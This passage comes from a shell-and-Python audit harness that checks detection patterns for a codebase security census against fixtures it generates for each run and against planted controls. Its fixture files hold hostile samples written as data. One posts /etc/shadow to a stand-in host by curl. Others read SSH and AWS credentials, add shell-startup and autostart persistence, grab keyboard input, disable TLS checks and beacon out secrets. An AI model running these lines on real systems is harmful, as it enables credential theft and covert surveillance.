S10	persistence	T6c	site	line	docs	negative sweep	yes
S11	input-capture	T6c	site	line	docs	plan T6c names the input-capture sweep explicitly	yes
S12	parser-network-bytes	T5	site	file	docs	decode path: stb / mmproj / GGUF / HTTP framing / tokenizer	n/a
S13	vendored-third-party	T12	site	file	docs	dependency provenance and the hash gap: one row per vendored file	n/a
S14	orphan-config-key	T9	procedure	key	-	the plan gives T9 the post-97ff061 surviving-key grep	n/a
S15	diagnostics-shaped	T6a	procedure	file	-	logging and metrics disclosure, one row per report builder	n/a
S16	import-holes	T12	substrate	-	-	python import substrate: reported in census.md, no column-6 token	n/a
S17	build-deps	T12	substrate	-	-	build-time external deps: reported in census.md, no column-6 token	n/a
S18	model-instruction	T14	procedure	file	none	GAP: no plan File: owns vendor AGENTS.md/.github model-directed text	n/a
S19	net-library-import	T4	site	file	docs	a library that can connect with no socket primitive in this file	n/a
ROUTE
# PREDICATE_SHA256 hashes the PREDICATE (families.tsv ‖ routing.tsv), not the script. Hashing the
# script would move the token on every printf edit, so it could not serve as a freeze anchor
# (hoodie M6). WHAT IT DOES AND DOES NOT FREEZE, corrected 2026-11-05 because the previous version of
# this comment over-claimed: it says "every knob that moves a row count is a column in these two files,
# so an equal hash means an equal predicate" — true of row COUNTS. But the observation semantics in
# column 8 are load-bearing evidence now (each row names the line hits behind it), those live in the awk,
# and DEFECT 4 changed their meaning for every S12/S13/S19 row WITHOUT moving this hash. Equal predicate
# therefore does not mean equal row evidence; that half of "the identical census" is GENERATOR_SHA256's
# job, and the INPUT hashes are the third leg. Three tokens, three claims, none of them redundant.
PRED_SHA=$(cat "$RUN/families.tsv" "$RUN/routing.tsv" | sha256sum | cut -d' ' -f1)
echo "PREDICATE_SHA256=$PRED_SHA   # sha256(families.tsv || routing.tsv); freezes row COUNTS only — see the comment above for what it does not freeze"
printf '%s\n' "$PRED_SHA" > "$RUN/predicate.sha256"
# The comparison lives HERE, not in the tree-diff block above: PRED_SHA is only computable after the two
# heredocs are written, and moving the hash earlier would hash bytes that are not the predicate.
if [ "$TAG" != real ]; then
  if [ -f "$T3/run-real/predicate.sha256" ]; then
    chk PREDICATE_SHA_SAME_AS_REAL    eq "$(cat "$T3/run-real/predicate.sha256")" "$PRED_SHA"
  else
    echo "PREDICATE_SHA_SAME_AS_REAL=unavailable (run-real/predicate.sha256 missing — the canary claim cannot prove the same predicate ran)"
    FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES PREDICATE_SHA_AVAILABLE"
  fi
fi

# --------------------------------------------------------------- 1 fixture corpus
# A self-test proves a pattern fires on a fixture; it does NOT prove it would have fired in this
# tree. So the corpus is generated fresh each run (never committed, never planted in either tree)
# and every narrow pattern is run over it. FIXTURE_HITS is a sensitivity number: how many of the
# shapes the census is SUPPOSED to see, it actually sees.
FIX="$RUN/fixtures"
mkdir -p "$FIX"
cat > "$FIX/a_socket.c" <<'X'
int s = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in sa; sa.sin_port = htons(4444);
bind(s, (struct sockaddr*)&sa, sizeof sa); listen(s, 8); accept(s, 0, 0);
sendto(s, buf, n, 0, 0, 0); getaddrinfo("h", "80", 0, &res);
X
cat > "$FIX/b_exec.py" <<'X'
import subprocess, os
subprocess.run(["curl", "--data-binary", "@/etc/shadow", "https://canary.example.invalid/x"])
os.system("ping -c1 host.invalid"); os.execvp("wget", ["wget", "-qO-", "http://canary.example.invalid"])
X
cat > "$FIX/c_load.py" <<'X'
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc["sendto"](3, buf, n, 0, 0, 0)
getattr(libc, "connect")(fd, addr, len)
X
cat > "$FIX/d_syscall.cu" <<'X'
__global__ void k() { }
long r = syscall(SYS_getpid);
__threadfence_system();
X
cat > "$FIX/e_write.py" <<'X'
from pathlib import Path
p = Path.home() / ".cache" / "basalt" / "blob"
p.write_bytes(data)
open("/tmp/opencode-x", "wb").write(b"x")
X
cat > "$FIX/f_fingerprint.py" <<'X'
import os, platform, socket, uuid
env = os.environ.get("CUDA_VISIBLE_DEVICES"); node = platform.node(); mac = uuid.getnode()
h = socket.gethostname(); mid = open("/etc/machine-id").read(); c = open("/proc/cpuinfo").read()
X
cat > "$FIX/g_cred.py" <<'X'
import os
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
aws = open(os.path.expanduser("~/.aws/credentials")).read()
X
cat > "$FIX/h_proc.cpp" <<'X'
std::ifstream in("/proc/pressure/memory"); std::ifstream m("/sys/fs/cgroup/memory.max");
std::system("cat /proc/self/environ");
X
cat > "$FIX/i_persist.py" <<'X'
subprocess.run(["crontab", "-l"]); open(os.path.expanduser("~/.bashrc"), "a").write(line)
install = os.path.expanduser("~/.config/autostart/basalt.desktop")
X
cat > "$FIX/j_capture.c" <<'X'
int r = ioctl(fd, EVIOCGRAB, 1); struct input_event ev; open("/dev/input/event0", O_RDONLY);
X
cat > "$FIX/k_parse.py" <<'X'
import struct, zipfile, jinja2
head = struct.unpack("<4I", buf[:16]); z = zipfile.ZipFile(fp)
tmpl = jinja2.Environment().from_string(user_input)
X
cat > "$FIX/l_net_lib.py" <<'X'
import urllib.request, ssl, http.client
ctx = ssl._create_unverified_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=3)
conn = http.client.HTTPConnection("canary.example.invalid"); conn.request("POST", "/", body)
X
cat > "$FIX/m_net_js.js" <<'X'
fetch("/v1/chat", {method:"POST", body: JSON.stringify({k: secret})});
new Image().src = "https://canary.example.invalid/g?a=" + encodeURIComponent(secret);
navigator.sendBeacon("/x", data); new EventSource("https://canary.example.invalid/s");
X
cat > "$FIX/n_listen.py" <<'X'
import socket
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.bind(("0.0.0.0", 8080)); srv.listen(4096)
X
cat > "$FIX/o_vendored.h" <<'X'
/* stb_image - v2.30 - public domain image loader */
#define GGML_QUANTS_H 1
X
cat > "$FIX/p_dynamic.py" <<'X'
import importlib
mod = importlib.import_module("http" + ".client")
fn = __import__("urllib" + ".request")
payload = bytes.fromhex("68747470733a2f2f63616e617279").decode(); exec("x=1")
X
cat > "$FIX/q_instruction.md" <<'X'
Before you add a flag, you should read AGENTS.md. The agent must never use `curl`.
X
# every fixture is a file-class probe as well: .c .py .cu .cpp .js .h .md all appear, so
# "0 hits in raw-syscall" can be told apart from "the pass never looked at .cu".
# find, not ls, and the list lives in $RUN not $FIX. Two reasons, both real: `ls "$FIX"` while
# the redirect target fixlist.tmp already exists lists ITSELF, so FIXTURE_FILES counted one file
# too many and the path list handed to xargs named a file the mv had just deleted; and a list
# written INSIDE the corpus becomes part of the corpus on the next run, where its absolute paths
# are greppable by the very family patterns that are supposed to be scored against it.
fixture_list() { LC_ALL=C find "$FIX" -maxdepth 1 -type f ! -name 'fixlist*' -printf '%f\n' | LC_ALL=C sort; }
fixture_list | sed "s|^|$FIX/|" > "$RUN/fixlist.txt"
fixture_list | sed 's|.*\.||' | LC_ALL=C sort | uniq -c | LC_ALL=C sort -rn > "$RUN/fixture-classes.txt"
echo "FIXTURE_FILES=$(grep -c . "$RUN/fixlist.txt")"
echo "-- fixture corpus (file classes the census must be able to read) --"; cat "$RUN/fixture-classes.txt"

# --------------------------------------------------------------- 2 self-tests + sensitivity
FAILS=0; FIXTOT=0; FIXHIT=0
: > "$RUN/patterns.tsv"
while IFS=$'\t' read -r name narrow wide probe mode; do
  [ -n "${name:-}" ] || continue
  mode=${mode:-line}
  case "$narrow" in
    *' && '*) p1=${narrow%%" && "*}; p2=${narrow##*" && "} ;;
    *) p1="$narrow"; p2="" ;;
  esac
  case "$narrow" in
    *' && '*) if printf '%s\n' "$probe" | grep -Eqe "$p1" && printf '%s\n' "$probe" | grep -Eqe "$p2"; then ok=1; else ok=0; fi ;;
    *) printf '%s\n' "$probe" | grep -Eqe "$narrow" && ok=1 || ok=0 ;;
  esac
  # sensitivity: how many fixture files does this narrow pattern reach at all?
  # cooccur is scored the same way the tree pass scores it: BOTH halves present in the SAME file.
  if [ "$mode" = cooccur ]; then
    fh=$(xargs -a "$RUN/fixlist.txt" -d '\n' -r grep -IlE -e "$p1" 2>/dev/null \
         | xargs -r grep -IlE -e "$p2" 2>/dev/null | wc -l)
  else
    fh=$(xargs -a "$RUN/fixlist.txt" -d '\n' -r grep -IlE -e "$narrow" 2>/dev/null | wc -l)
  fi
  FIXTOT=$((FIXTOT+1))
  [ "$fh" -gt 0 ] && FIXHIT=$((FIXHIT+1))
  psha=$(printf '%s' "$narrow" | sha256sum | cut -c1-16)
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$name" "$psha" "$([ "$ok" = 1 ] && echo PATTERN_OK || echo PATTERN_FAIL)" "$fh" "$mode" "$narrow" >> "$RUN/patterns.tsv"
  if [ "$ok" = 1 ]; then printf 'PATTERN_OK   %-22s mode=%-8s fixture_files_touched=%-3s pattern_sha256=%s\n' "$name" "$mode" "$fh" "$psha"
  else printf 'PATTERN_FAIL %-22s mode=%-8s fixture_files_touched=%-3s  <-- narrow pattern cannot fire; its zero is worthless\n' "$name" "$mode" "$fh"; FAILS=$((FAILS+1)); fi
done < "$RUN/families.tsv"
echo "PATTERN_FAILS=$FAILS (expect 0)"
echo "FAMILIES=$(wc -l < "$RUN/families.tsv") FIXTURE_FILES=$(wc -l < "$RUN/fixlist.txt") FAMILIES_SEEN_IN_FIXTURES=$FIXHIT/$FIXTOT  # sensitivity: of the $(wc -l < "$RUN/families.tsv") narrow patterns, how many reach any planted shape at all"
# families that touch NO fixture are the ones whose zero in the real tree means least
echo "FAMILIES_UNTOUCHED_BY_FIXTURES=$(( $(wc -l < "$RUN/families.tsv") - FIXHIT ))  # named in patterns.tsv; their zeros are unproven until an in-tree canary fires"

# --------------------------------------------------------------- 3 per-family pass over the tree
grep_files() { xargs -a "$2" -d '\n' -r grep -InE -e "$1" 2>/dev/null; }
paths_of() { cut -f1 "$1" | sed 's/:[[:digit:]]*$//' | LC_ALL=C sort -u; }
PROC_FAMS='orphan-config-key diagnostics-shaped model-instruction'
WIDE_ONLY_BAD=0; WIDE_NOISE=''
while IFS=$'\t' read -r name narrow wide probe mode; do
  [ -n "${name:-}" ] || continue
  mode=${mode:-line}
  case "$narrow" in
    *' && '*) p1=${narrow%%" && "*}; p2=${narrow##*" && "} ;;
    *) p1="$narrow"; p2="" ;;
  esac
  if [ "$mode" = cooccur ]; then
    grep_files "$p1" "$UNIV" | cut -d: -f1 | LC_ALL=C sort -u > "$RUN/$name.sink-files.txt"
    grep_files "$p2" "$UNIV" | cut -d: -f1 | LC_ALL=C sort -u > "$RUN/$name.path-files.txt"
    LC_ALL=C comm -12 "$RUN/$name.sink-files.txt" "$RUN/$name.path-files.txt" > "$RUN/$name.cooccur-files.txt"
    awk 'NR==FNR{f[$0]=1; next} ($0 in f)' "$RUN/$name.cooccur-files.txt" "$UNIV" > "$RUN/$name.cooccur-list.txt"
    grep_files "$p1" "$RUN/$name.cooccur-list.txt" | awk -F: -v n="$name" 'NF>=2{print $1":"$2"\t"n}' > "$RUN/$name.narrow.tsv"
    union="$p1|$p2|$wide"
  else
    grep_files "$p1" "$UNIV" | awk -F: -v n="$name" 'NF>=2{print $1":"$2"\t"n}' > "$RUN/$name.narrow.tsv"
    union="($p1)|($wide)"
  fi
  grep_files "$union" "$UNIV" | awk -F: 'NF>=2{print $1":"$2}' | LC_ALL=C sort -u > "$RUN/$name.wide.tsv"
  nh=$(awk 'END{print NR+0}' "$RUN/$name.narrow.tsv"); nf=$(paths_of "$RUN/$name.narrow.tsv" | wc -l)
  wh=$(awk 'END{print NR+0}' "$RUN/$name.wide.tsv")
  # WIDE_ONLY_HITS is the honest homonym budget: hits the keyword pass sees and the narrow pass
  # rejects. It used to be printed as `homonym_delta` over two unrelated patterns, which went
  # negative (dns -1, parser -50) and therefore measured nothing.
  wide_only=$(LC_ALL=C comm -23 "$RUN/$name.wide.tsv" <(LC_ALL=C sort -u "$RUN/$name.narrow.tsv" | cut -f1) | wc -l)
  # the superset relation is asserted (it holds by construction now; a failure means the table was
  # edited into two unrelated patterns again, which is exactly what happened once)
  bad=$(LC_ALL=C comm -23 <(LC_ALL=C sort -u "$RUN/$name.narrow.tsv" | cut -f1) "$RUN/$name.wide.tsv" | wc -l)
  [ "$bad" -eq 0 ] || WIDE_ONLY_BAD=$((WIDE_ONLY_BAD+1))
  # Pattern disagreement, as a named list rather than a ratio the reader has to derive. `wide_hits=595
  # wide_only_hits=594` forces long division at 11pm to discover the keyword pass added almost nothing
  # the narrow pattern also sees. What the share does NOT license is the word "noise" — see the echo
  # below, where the limit is stated with the number.
  WIDE_SHARE=$(awk -v w="$wh" -v o="$wide_only" 'BEGIN{printf "%d", (w?100*o/w:0)}')
  if [ "$wh" -gt 0 ] && [ "$WIDE_SHARE" -ge 95 ]; then
    # ${VAR:+$VAR,} rather than "$VAR $x": space-joined left a leading space on the printed list, so
    # the line read `FAMILIES_WIDE_...= credential-store(95%)` — a field that looks like it starts with
    # an empty element, in a script whose last three defects were all "a value that reads wrong".
    WIDE_NOISE="${WIDE_NOISE:+$WIDE_NOISE,}$name(${wide_only}/${wh}=${WIDE_SHARE}%)"
  fi
  status=$([ "$nh" -gt 0 ] && echo SCANNED_HITS || echo "SCANNED_NONE (fixture-only proof: no in-tree canary yet)")
  printf 'FAMILY %-22s mode=%-8s %-46s narrow_lines=%-5s narrow_files=%-4s wide_hits=%-6s wide_only_hits=%-6s narrow_not_in_wide=%s\n' \
    "$name" "$mode" "$status" "$nh" "$nf" "$wh" "$wide_only" "$bad"
  paths_of "$RUN/$name.narrow.tsv" | awk -v n="$name" '{print $1"\t"n}' > "$RUN/$name.files.tsv"
  case " $PROC_FAMS " in *" $name "*) :> "$RUN/$name.files.tsv";; esac
done < "$RUN/families.tsv"
echo "FAMILIES_WITH_NARROW_OUTSIDE_WIDE=$WIDE_ONLY_BAD (expect 0; nonzero means the wide pattern is no longer a superset)"
echo "FAMILIES_WIDE_HITS_REJECTED_BY_NARROW_GE_95PCT=${WIDE_NOISE:-none}  # value is wide-only/wide = share. LIMIT, stated because the number does not say it: those extras are UNREVIEWED homonyms, not proven noise. The line measures how completely the two patterns disagree; calling them noise is a reading decision census.md has to defend per family."

# --------------------------------------------------------------- 4 the procedures
# S14 ORPHAN CONFIG KEYS — v3. v1 asked "does the flag's snake_case name reappear outside the
# declaring file?" and produced 9 rows, ALL FALSE POSITIVES: `--control-vector` assigns
# `o.cvec_files` inside arguments.cpp and cvec_files is read in src/program/cli/control_vectors.cpp;
# `--resident-budget-gib` assigns `o.resident_budget`, a string that does not contain
# "resident_budget_gib" at all. The flag literal appears only in arguments.cpp BY CONSTRUCTION, so
# that predicate has no discrimination power on this key space. v2 traced assignment targets and
# broke the Python half, because argparse binds args.<attr> implicitly and never names it, so
# `--api-key` looked "parsed and never stored" while serve/security.py:53 reads it.
# v3 is the hybrid, and each half states what it can actually see.
# The procedure is written to its own file rather than run from a heredoc, so the IDENTICAL text
# can be pointed at the tree and at the fixture below. A control that cannot be run against a
# planted sinkless key is not a control, and this family's zero is the one the plan calls
# highest-signal.
cat > "$RUN/s14-procedure.py" <<'PY'
import re, sys, os
ROOT, RUN, univ_path, outname = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
# argv[5], optional: a key prefix. The SAME script runs against the audit tree and against the S14/S15
# fixture corpora, and printed the SAME key names for both — so `grep S14_DENOMINATOR_PY_FILES` over the
# transcript returns 10 and 0 with nothing on either line saying which tree it came from, and this
# transcript is consumed by grep. The control run passes CTRL_; the audit run passes nothing, so its
# output is byte-identical to before and the *_REAL grabs are untouched.
PFX = sys.argv[5] if len(sys.argv) > 5 else ""
uni = [l.strip() for l in open(univ_path) if l.strip()]
def read(p):
    try: return open(os.path.join(ROOT, p), encoding='utf-8', errors='replace').read()
    except OSError: return ''
blob = {f: read(f) for f in uni}
py  = [f for f in uni if f.endswith('.py')]
cpp = [f for f in uni if f.rsplit('.',1)[-1] in ('cpp','hpp','h','cu','cuh','c')]
NET = re.compile(r'host|port|url|endpoint|uri|token|key|origin|proxy|addr|remote|server|fetch|upload|webhook|report|peer|connect|listen', re.I)
def is_test(f):
    return f.startswith(('serve/tests/','tests/')) or f.rsplit('/',1)[-1].startswith(('test_','_test'))
rows = []

# --- C++: two hops. flag -> the fields its branch assigns -> is the field read elsewhere? ---
args_cpp = 'src/program/cli/arguments.cpp'
cflags = sorted(set(re.findall(r'"--([a-z0-9-]+)"', blob.get(args_cpp,''))))
prod_cpp = [f for f in cpp if not is_test(f)]
def branch(text, flag):
    lines = text.splitlines(); out = []
    for i,l in enumerate(lines):
        if ('"--%s"' % flag) in l:
            j = i+1
            while j < len(lines) and not re.search(r'else if \(a == "--', lines[j]): j += 1
            out.extend(lines[i:j])
    return '\n'.join(out)
NOISE = {'c_str','data','size','length','substr','find','at','empty','string','next','push_back','rbegin','end'}
# Two assignment shapes carry a parsed value OUT of arguments.cpp:
#   o.<field> = ...          the options struct   (v2 caught this)
#   <ident> = next(...)      a bare out-parameter (std::string& ppl_base). v2 MISSED this shape and
#                            so reported --ppl-base as a sinkless orphan: it is not, ppl_base goes
#                            startup.cpp -> generate/configure.cpp -> dispatch.cpp -> PplGate. That
#                            is a fourth hop, but the FIRST hop is what the predicate can see, and
#                            naming the target is enough to disprove orphanhood.
OUTARG = re.compile(r'^\s*([a-z_][a-z0-9_]{3,})\s*=\s*(?:next\(|std::|[\w:]+\()')
for k in cflags:
    src = branch(blob.get(args_cpp,''), k)
    fields = sorted({m for m in re.findall(r'\bo\.([a-z_][a-z0-9_]*)', src)} - NOISE)
    outargs = sorted({m for m in OUTARG.findall(src)} - NOISE - set(fields))
    fields = fields + outargs
    calls  = sorted({m for m in re.findall(r'\b(?:basalt::core::|basalt::)?([a-z_][a-z0-9_]{4,})\s*\(', src)}
                    - NOISE - {'if','for','while','switch','return','atoi','atof','atoll','error','info','warn',
                               'sizeof','static_cast','reinterpret_cast','max','min','getline','printf','sprintf'})
    if not fields and not calls:
        rows.append(('DROPPED-VALUE','NETWORK-NAMED' if NET.search(k) else 'other', k, args_cpp,
                     'parsed and never assigned to any field or handed to any call'))
        continue
    consumers = {}
    for fld in fields + calls:
        for f in prod_cpp:
            if f == args_cpp or f.endswith('options.hpp'): continue
            if re.search(r'\b'+re.escape(fld)+r'\b', blob[f]): consumers[fld] = f; break
    if not consumers:
        rows.append(('ORPHAN-FIELD','NETWORK-NAMED' if NET.search(k) else 'other', k, args_cpp,
                     'assigns '+','.join((fields+calls)[:4])+' — never named outside '+args_cpp))
print(PFX+"CPP_FLAGS=%d " % len(cflags) + PFX+"CPP_TWO_HOP_ORPHANS=%d " % sum(1 for r in rows)
      + PFX+"CPP_TWO_HOP_NETWORK_NAMED=%d" % sum(1 for r in rows if r[1]=='NETWORK-NAMED'))

# --- Python: argparse. The flag lands in args.<attr> implicitly; consumers are modules that read
# that attribute. This is v1's rule, which was right; what v1 got wrong was applying its C++ rule
# to C++. Each row records WHERE it is read, so the claim is checkable. ---
cfg = 'serve/config.py'
pflags = sorted(set(re.findall(r'add_argument\("--([a-z0-9-]+)"', blob.get(cfg,''))))
prod_py = [f for f in py if not is_test(f) and f != cfg]
py_orph = 0
# The join is by NAME, not by dataflow, so the pattern has to be as narrow as a name-only join can
# be. v2's r'\b<attr>\b' matched BARE IDENTIFIERS, so --tokenizer "read at serve/engine/mock.py"
# was a homonym: mock.py's `tokenizer` is a constructor parameter of the mock engine, not the value
# of the flag. Attribute access is what argparse output actually looks like (cfg.<attr>, args.<attr>,
# self.<attr>, or a keyword call dest=<attr>), so that is what we require. Measured on the audited
# tree: every one of the 11 network-named verdicts survives this change on its own evidence, so the
# stricter predicate preserves the result and removes the homonym class. It cannot see a flag read
# through getattr() or a dict-namespace unpack — named limit, see census.md.
ATTR = lambda a: re.compile(r'\.'+re.escape(a)+r'\b|\b'+re.escape(a)+r'\s*=[^=]|\b'+re.escape(a)+r'\s*=\s*$')
for k in pflags:
    attr = k.replace('-','_')
    readers = [f for f in prod_py if ATTR(attr).search(blob[f])]
    if not readers:
        py_orph += 1
        rows.append(('ORPHAN-ATTR','NETWORK-NAMED' if NET.search(k) else 'other', k, cfg,
                     'no attribute read of '+attr+' outside serve/config.py (name-only join)'))
    elif NET.search(k):
        rows.append(('CONSUMED','NETWORK-NAMED', k, cfg, 'read at '+readers[0]))
print(PFX+"PY_FLAGS=%d " % len(pflags) + PFX+"PY_ORPHANS=%d" % py_orph
      + "  (every network-named flag listed with its reader, so a zero is checkable)")
sinkless = [r for r in rows if r[0].startswith(('ORPHAN','DROPPED'))]
print(PFX+"S14_ROWS_TOTAL=%d " % len(rows) + PFX+"S14_SINKLESS=%d " % len(sinkless)
      + PFX+"S14_SINKLESS_NETWORK_NAMED=%d" % sum(1 for r in sinkless if r[1]=='NETWORK-NAMED'))
# ---------------- DENOMINATOR (neckbeard): this family audits ONE declaring file per language.
# "0 of 31 orphaned" is only a claim about the key space if the key space is those 31. Counting the
# declarations elsewhere is the difference between a census and a sample, and on the audited tree
# the answer is NOT zero. Printed every run so the sentence in census.md can never outrun it.
oth_py = [f for f in py if f != cfg and 'add_argument(' in blob[f]]
oth_py_lines = sum(len(re.findall(r'add_argument\(\s*["\']--', blob[f])) for f in oth_py)
oth_cpp = [f for f in cpp if f != args_cpp and re.search(r'["\']--[a-z0-9]', blob[f])]
oth_cpp_lit = sum(len(set(re.findall(r'["\']--([a-z0-9-]+)["\']', blob[f]))) for f in oth_cpp)
print(PFX+"S14_DENOMINATOR_PY_FILES_WITH_ADD_ARGUMENT_OUTSIDE_CONFIG=%d " % len(oth_py)
      + PFX+"ADD_ARGUMENT_LINES_OUTSIDE_CONFIG=%d" % oth_py_lines)
print(PFX+"S14_DENOMINATOR_CPP_FILES_WITH_FLAG_LITERALS_OUTSIDE_ARGUMENTS=%d " % len(oth_cpp)
      + PFX+"DISTINCT_FLAGS_IN_THEM=%d" % oth_cpp_lit)
print(PFX+"S14_COVERAGE=py %d/%d cpp %d/%d  # the family's zero is bounded by THIS, not by the tree" % (
    len(pflags), len(pflags)+oth_py_lines, len(cflags), len(cflags)+oth_cpp_lit))
for r in rows: print("   ", '\t'.join(r))
with open(os.path.join(RUN, outname),'w') as fh:
    for r in rows: fh.write('\t'.join(r)+'\n')
PY
# ROOT is "." because this script has already cd'd into the tree; the universe paths are tree-relative.
runpy S14_PROCEDURE_REAL "$RUN/s14-procedure.py" . "$RUN" "$UNIV" orphan-config-key.tsv
# The family's zero is bounded by its DENOMINATOR, not by the tree: S14 reads one declaring file per
# language, and the audited tree declares keys in ten more. Surfaced as a sentinel so the sentence in
# census.md can never be quoted without its fraction.
S14DPY=$(grab S14_PROCEDURE_REAL S14_DENOMINATOR_PY_FILES_WITH_ADD_ARGUMENT_OUTSIDE_CONFIG)
S14DCPP=$(grab S14_PROCEDURE_REAL S14_DENOMINATOR_CPP_FILES_WITH_FLAG_LITERALS_OUTSIDE_ARGUMENTS)
# Two assertions, never one on a concatenation. This used to be
# `chk S14_DENOMINATOR_REPORTED nonempty "${S14DPY}${S14DCPP}"`, and "00" is non-empty, and if the
# python half stopped printing the CPP half entirely the grab returns '' and the concatenation is still
# "3" — PASS, with `cpp_flag_literal_files=?` printed on the next line. That violates the harness's own
# rule at line ~69 ("an empty or unset ACTUAL always FAILS"): concatenating two ACTUALs into one slot is
# exactly how you defeat that guard. Both denominators bound the family the plan calls highest-signal,
# so both get their own floor.
chk S14_DENOM_PY_FILES_GE_1           ge 1 "$S14DPY"
chk S14_DENOM_CPP_FILES_GE_1          ge 1 "$S14DCPP"
echo "S14_KEY_SPACE_OUTSIDE_THE_AUDITED_FILES py_add_argument_files=${S14DPY:-?} cpp_flag_literal_files=${S14DCPP:-?}  # see S14_COVERAGE above"
awk -F'\t' '$1 ~ /^ORPHAN|^DROPPED/ {print $4"\torphan-config-key"}' "$RUN/orphan-config-key.tsv" \
  | LC_ALL=C sort -u > "$RUN/orphan-config-key.files.tsv"
[ -s "$RUN/orphan-config-key.files.tsv" ] || : > "$RUN/orphan-config-key.files.tsv"
echo "ORPHAN_ROWS=$(awk 'END{print NR+0}' "$RUN/orphan-config-key.tsv")"

# S14's negative control: the same procedure file, pointed at a planted tree. The fixture declares
# two flags — one whose assigned field is read in another file, one whose field is read nowhere.
# The control PASSES only if exactly the sinkless, network-named one is reported. If the fixture
# prints zero rows, the family's zero in the real tree proves nothing and census.md says so.
mkdir -p "$RUN/s14-fixture/src/program/cli" "$RUN/s14-fixture/serve"
cat > "$RUN/s14-fixture/src/program/cli/arguments.cpp" <<'X'
else if (a == "--image-webhook-url") o.webhook_url = next("--image-webhook-url");
else if (a == "--live-max-tokens")   o.live_max = std::atoi(next("--live-max-tokens"));
X
cat > "$RUN/s14-fixture/src/program/cli/report.cpp" <<'X'
// the consumer that makes --live-max-tokens NOT an orphan
int t = static_cast<int>(o.live_max);
X
cat > "$RUN/s14-fixture/serve/config.py" <<'X'
p.add_argument("--remote-report-url", default="")
p.add_argument("--upload-endpoint", default="")        # (a) consumed: attr read in serve/other.py
p.add_argument("--sink-target", dest="rru", default="") # (b) dest-alias: reader is cfg.rru
p.add_argument("--webhook-path", default="")            # (c) only reader is under serve/tests/
X
cat > "$RUN/s14-fixture/serve/other.py" <<'X'
# (a) exists to execute the CONSUMED branch, which otherwise has never run in any control: the claim
# "every network-named python flag names its reader" would otherwise be emitted by untested code.
url = cfg.upload_endpoint
X
cat > "$RUN/s14-fixture/serve/consumer.py" <<'X'
# (b) THE PLANTED FALSE POSITIVE. argparse binds --sink-target to dest="rru", so the real consumer
# reads cfg.rru and my predicate looks for `sink_target` and finds nothing: it will report this row
# ORPHAN. That is the known blind spot of a name-only join, planted so the control PROVES the
# blind spot exists instead of leaving it as an apology in prose. Expect it to fire.
addr = cfg.rru
X
mkdir -p "$RUN/s14-fixture/serve/tests"
cat > "$RUN/s14-fixture/serve/tests/test_webhook.py" <<'X'
# (c) the only reader of --webhook-path is a TEST. is_test() is load-bearing in both halves of the
# predicate (26 of the 34 net-socket sites live in exactly that directory) and was untested; here it
# must EXCLUDE this reader, so --webhook-path is reported ORPHAN by design.
path = cfg.webhook_path
X
find "$RUN/s14-fixture" -type f | sed "s|^$RUN/s14-fixture/||" | LC_ALL=C sort > "$RUN/s14-fixture-universe.txt"
echo "-- S14 control run --"
echo "   expect FIRED: image-webhook-url, remote-report-url (true sinkless), sink-target (PLANTED"
echo "   false positive: dest-alias), webhook-path (test-only reader, is_test must exclude it)"
echo "   expect SILENT: live-max-tokens (planted consumer), upload-endpoint (planted attr reader)"
# CTRL_ is argv[5]: every key this run prints comes out CTRL_-prefixed, so the fixture's denominators can
# never be mistaken for the tree's by a grep over the transcript. See the PFX comment in the procedure.
runpy S14_PROCEDURE_CONTROL "$RUN/s14-procedure.py" "$RUN/s14-fixture" "$RUN" "$RUN/s14-fixture-universe.txt" s14-fixture-rows.tsv CTRL_
# (no `need s14-fixture-rows.tsv` here — DELETED, not replaced. python opens that file with 'w' whether
# or not it writes a row, and the chk a couple of lines below already requires a non-empty captured set.
# It was a strict logical implication of the assertion after it, and it inflated SENTINEL_TOTAL on the
# control the plan leans hardest on.)
S14C=$(awk -F'\t' '$1 ~ /^ORPHAN|^DROPPED/{print $3}' "$RUN/s14-fixture-rows.tsv" 2>/dev/null | LC_ALL=C sort | paste -sd, -)
S14_EXPECT='image-webhook-url,remote-report-url,sink-target,webhook-path'
chk S14_CONTROL_FIRED_SET             eq "$S14_EXPECT" "$S14C"
echo "S14_CONTROL_FIRED=$S14C"
echo "S14_CONTROL_EXPECTED=$S14_EXPECT   # two true sinkless + one PLANTED false positive (dest-alias)"
echo "                                     # + one test-only reader. live-max-tokens and upload-endpoint"
echo "                                     # have planted consumers and must NOT appear."
# A false SILENT is the failure mode that hides a real orphan: assert the two consumer-bearing flags
# are genuinely absent, not merely that the set has the right size.
S14LEAK=$(printf '%s\n' "$S14C" | tr ',' '\n' | grep -cE '^(live-max-tokens|upload-endpoint)$')
chk S14_CONTROL_NO_CONSUMER_LEAK      z    "$S14LEAK"

# S15 DIAGNOSTICS-SHAPED OUTBOUND — shape, not keyword: report-builders joined against the import
# closure of the modules that hold a network/exec/dlopen call shape.
# Same architecture as S14: the procedure is written to its own file so the IDENTICAL text runs
# against the tree and against a planted fixture. 16 of 509 rows come from this procedure, and until
# now it had no fixture, no control run and no self-test — a dead import regex would have printed
# "no-sink-in-closure" for every builder and nothing would have failed.
cat > "$RUN/s15-procedure.py" <<'PY'
import re, os, sys, collections
ROOT, RUN, univ_path, outname = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
# argv[5], optional: a key prefix. The SAME script runs against the audit tree and against the S14/S15
# fixture corpora, and printed the SAME key names for both — so `grep S14_DENOMINATOR_PY_FILES` over the
# transcript returns 10 and 0 with nothing on either line saying which tree it came from, and this
# transcript is consumed by grep. The control run passes CTRL_; the audit run passes nothing, so its
# output is byte-identical to before and the *_REAL grabs are untouched.
PFX = sys.argv[5] if len(sys.argv) > 5 else ""
uni = [l.strip() for l in open(univ_path) if l.strip()]
py  = [f for f in uni if f.endswith('.py')]
def read(p):
    try: return open(os.path.join(ROOT, p), encoding='utf-8', errors='replace').read()
    except OSError: return ''
blob = {f: read(f) for f in py}
shipped = [f for f in py if f.startswith(('serve/','tools/','data/'))
           and not f.startswith(('serve/tests/','tools/test_')) and not f.rsplit('/',1)[-1].startswith('test_')]
mod2file = {f[:-3].replace('/','.') : f for f in py}
